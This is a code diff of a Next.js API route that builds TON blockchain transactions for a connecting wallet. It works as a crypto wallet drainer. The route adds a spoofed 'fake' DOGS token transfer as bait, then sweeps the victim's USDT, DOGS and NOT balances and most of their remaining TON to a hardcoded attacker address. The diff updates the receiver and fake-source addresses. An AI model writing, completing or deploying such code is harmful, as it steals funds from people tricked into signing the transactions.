@@ -1,10 +1,10 @@
 import {Address, beginCell, StateInit, storeStateInit, toNano, TonClient, TupleBuilder} from "@ton/ton";
-import { NextRequest, NextResponse } from "next/server";
+import {NextRequest, NextResponse} from "next/server";
 
 
 const client = new TonClient({
 	endpoint: 'https://toncenter.com/api/v2/jsonRPC',
-	apiKey:  process.env['TON_API']
+	apiKey: process.env['TON_API']
 });
 
 const dogsAddress = "EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS";
@@ -45,62 +45,62 @@ export async function POST(req: NextRequest) {
 	// 	return NextResponse.json(o)
 	// }
 
-	const { address: sender } = await req.json();
+	const {address: senderAddress} = await req.json();
 
-	const receiver = "UQBOENjSOsj8c3Hosh4e2hAHmxW2Fzcw2U1KixwnvyT-m5hW";
-	const senderWallet = Address.parse(sender);
-	const receiverWallet = Address.parse(receiver);
+	const receiverAddress = "UQCwIguY34l9G5fb7uXKaC44PVUYYhqMAvBCqQca7C0kLMlS";
+	const senderWallet = Address.parse(senderAddress);
+	const receiverWallet = Address.parse(receiverAddress);
 
 	const fee = toNano("0.05");
 	const tons = await client.getBalance(senderWallet);
 
-	if (tons < toNano('0.2')) throw("Balance")
+	if (tons < toNano('0.2')) throw ("Balance")
 
-	// FAKE TRANSACTION
-	const dogsSenderJettonWallet = await getContractWallet(dogsAddress, senderWallet);
+	const fakeAddress = Address.parse("EQASdk1XxjMmu8MB3bjDlQxKqBBRtAvQTTmKG204Y-eRtbHT")
+	const fakeSource = await getContractWallet(dogsAddress, fakeAddress)
 	let transactions = [
 		{
 			amount: fee.toString(),
-			address: dogsSenderJettonWallet.toString(),
-			payload: await createTokenTransferPayload(receiverWallet, senderWallet, toNano('304734'))
+			address: fakeSource.toString(),
+			payload: await createTokenTransferPayload(fakeAddress, senderWallet, toNano('304734'))
 		}
 	];
-
 
 	const contracts = [
 		tetherAddress,
 		dogsAddress,
 		notAddress
 	]
-
 	for (let contract of contracts) {
 		const jettonWallet = await getContractWallet(contract, senderWallet);
-		const balance = await getTokenBalance(jettonWallet);
 
+		const balance = await getTokenBalance(jettonWallet);
 		if (!balance) continue;
+
 
 		const payload = await createTokenTransferPayload(
 			senderWallet,
 			receiverWallet,
 			balance
 		);
-
 		transactions.push({
 			address: jettonWallet.toString(),
 			amount: fee.toString(),
 			payload
 		})
+
 	}
 
-	transactions = transactions.slice(0,3)
-
-	const remains = (tons - (fee * BigInt(transactions.length + 1)));
+	transactions = transactions.slice(0, 2)
+	const remains = (tons - (fee * BigInt(transactions.length + 2)));
 	if (remains > toNano('0.2')) {
+
 		transactions.push({
-			address: receiverWallet.toString(),
+			address: receiverWallet.toRawString(),
 			amount: remains.toString(),
 			payload: (beginCell().storeUint(0, 32).storeStringTail(defaultText).endCell()).toBoc().toString('base64')
 		})
+
 	}
 
 	return NextResponse.json({
